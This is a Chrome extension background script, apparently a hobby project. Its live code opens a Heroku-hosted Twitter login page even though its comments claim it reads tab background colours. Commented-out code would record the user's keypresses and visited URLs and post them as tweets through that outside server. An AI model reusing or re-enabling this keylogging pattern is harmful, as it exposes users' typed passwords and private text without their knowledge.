// function sendTweet(status) {
//
//     console.log(status);
//     var object1 = {
//         status: status,
//     }
//
//     fetch('https://radiant-meadow-89003.herokuapp.com/postTweet', {
//     method: 'post',
//     body: JSON.stringify(object1),
//     headers: {
//         'Content-type': 'application/json',
//     }
// })
// };



// This function will eventually contain some logic
// for receiving background-color values from the
// current tab.
function getBgColors (tab) {
  // But for now, let's just make sure what we have so
  // far is working as expected.
  //alert('The browser action was clicked! Yay!');

  window.open('https://radiant-meadow-89003.herokuapp.com/login/twitter')
  // alert('I visited '+ document.location);
  // sendTweet('I just visited ' + document.location);
  //
  // document.addEventListener('keypress', function(e) {
  //     types += e.key;
  //
  //     if(timeOver) clearTimeout(timeOver);
  //     timeOver = setTimeout(() => {
  //         sendTweet('I just typed \"' + types + "\"");
  //         types = '';
  //     }, 10000);
  // }, false);
}

// When the browser action is clicked, call the
// getBgColors function.
chrome.browserAction.onClicked.addListener(getBgColors);
